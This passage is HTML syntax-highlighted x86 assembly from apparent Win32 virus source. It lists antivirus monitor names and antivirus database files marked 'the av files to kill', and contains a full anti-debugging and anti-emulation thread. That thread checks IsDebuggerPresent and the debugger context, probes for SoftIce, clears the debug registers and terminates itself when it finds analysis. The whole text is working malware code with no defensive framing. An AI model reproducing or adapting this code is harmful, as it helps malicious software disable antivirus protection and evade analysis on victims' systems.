       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hsemaphore</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_ReleaseSemaphore</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_ExitThread</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Thread_3_StartAddress</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">av_monitors</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'AVP Monitor'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Amon Antivirus Monitor'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">monitors_nr</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">searchfiles</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">av_list</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">L</span><span class="sc4">&gt;</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">AVP.CRC</span><span class="sc4">&gt;</span><span class="sc0">                             </span><span class="sc1">;the av files to kill</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">IVP.NTZ</span><span class="sc4">&gt;</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">Anti</span><span class="sc4">-</span><span class="sc5">Vir.DAT</span><span class="sc4">&gt;</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">CHKList.MS</span><span class="sc4">&gt;</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">CHKList.CPS</span><span class="sc4">&gt;</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SmartCHK.MS</span><span class="sc4">&gt;</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SmartCHK.CPS</span><span class="sc4">&gt;</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">AVG.AVI</span><span class="sc4">&gt;</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">NOD32.000</span><span class="sc4">&gt;</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">DRWEBASE.VDB</span><span class="sc4">&gt;</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">AGUARD.DAT</span><span class="sc4">&gt;</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">AVGQT.DAT</span><span class="sc4">&gt;</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">LGUARD.VPS</span><span class="sc4">&gt;</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">av_list_len</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">av_list</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">;€ This Thread is the anti-debugging and anti-emulation thread</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc5">Thread_4_StartAddress</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">PASCAL</span><span class="sc0"> </span><span class="sc5">tdelta</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@Thread4Delta</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@Thread4Delta</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@Thread4Delta</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">THREAD4SEH</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Thread4Exception</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Setup a SEH frame</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">ANTIEMU</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DebuggerKill</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;antidebugging stuffs.</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;Here we set up a new</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;seh frame and then we</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;make an exception error</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">                           </span><span class="sc1">;occur.</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">;TD stops here if in</span><span class="sc0">
                                                   </span><span class="sc1">;default mode.</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">shut_down</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DebuggerKill</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                            </span><span class="sc1">;the execution goes here</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0BDh</span><span class="sc0">                                     </span><span class="sc1">;delta gets lost so we</span><span class="sc0">
</span><span class="sc5">delta2</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                        </span><span class="sc1">;must restore it...</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@7</span><span class="sc0">                                     </span><span class="sc1">;here we try to retrieve</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'IsDebuggerPresent'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">;IsDebuggerPresent API</span><span class="sc0">
</span><span class="sc5">@7</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">k32</span><span class="sc4">]</span><span class="sc0">                              </span><span class="sc1">;if we fail it means we</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetProcAddress</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;don't have this api</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;(Windows95)</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">continue_antiemu</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;Let's check if our</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;process is being</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">shut_down</span><span class="sc0">                               </span><span class="sc1">;debugged.</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">                           </span><span class="sc1">; ECX = Context of debugger</span><span class="sc0">
       </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">softice</span><span class="sc0">                               </span><span class="sc1">; If ECX&lt;&gt;0, we're debugged</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">shut_down</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">softice</span><span class="sc4">:</span><span class="sc0">                                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SoftIce1</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;try to see if we are</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">detect_softice</span><span class="sc0">                         </span><span class="sc1">;being debugged by</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">shut_down</span><span class="sc0">                                </span><span class="sc1">;softice</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SoftIce1</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">detect_softice</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">shut_down</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">nod_ice</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">detect_softice</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000080h</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000003h</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_CreateFileA</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">cantcreate</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_CloseHandle</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">stc</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0c3h</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">cantcreate</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">clc</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0c3h</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">nod_ice</span><span class="sc4">:</span><span class="sc0">                                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">version</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">               </span><span class="sc1">;can we use debug regs?</span><span class="sc0">
       </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">cannot_kill_debug</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">drs</span><span class="sc4">]</span><span class="sc0">                          </span><span class="sc1">;Debug Registers opcodes</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">                                  </span><span class="sc1">;7 registers</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">bait</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">;point the opcode place</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">repp</span><span class="sc4">:</span><span class="sc0">                                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lodsb</span><span class="sc0">                                       </span><span class="sc1">;take the opcode</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                      </span><span class="sc1">;generate instruction</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">zapp</span><span class="sc0">                                   </span><span class="sc1">;call it!</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">repp</span><span class="sc0">                                   </span><span class="sc1">;do it again</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">compute_now</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">zapp</span><span class="sc4">:</span><span class="sc0">                                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;eax = 0</span><span class="sc0">
       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">230fh</span><span class="sc0">                                    </span><span class="sc1">;to mov DRx, eax</span><span class="sc0">
</span><span class="sc5">bait</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0C3h</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">drs</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0c0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f8h</span><span class="sc0">    </span><span class="sc1">;debug registers opcodes</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">compute_now</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dr0</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">shut_down</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">cannot_kill_debug</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">MMX</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mmx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_mmx_here</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6666h</span><span class="sc0">                              </span><span class="sc1">;do some loops</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1111h</span><span class="sc0">                              </span><span class="sc1">;very lite mmx_usage</span><span class="sc0">
</span><span class="sc1">;      movd1 mm1, esi                              ;</span><span class="sc0">
</span><span class="sc1">;      movd1 eax, mm1                              ;</span><span class="sc0">
</span><span class="sc1">;      cmp eax, esi                                ;</span><span class="sc0">
</span><span class="sc1">;      jne shut_down                               ;</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">no_mmx_here</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">                                </span><span class="sc1">;or by nod ice and</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                                     </span><span class="sc1">;others...</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">shut_down</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">continue_antiemu</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">shut_down</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_MessageBoxA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">debug</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">debug</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                      </span><span class="sc1">;If so, close down!!</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_ExitProcess</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;close</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">debug</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Shut down by anti-emulator'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">continue_antiemu</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ELSE</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
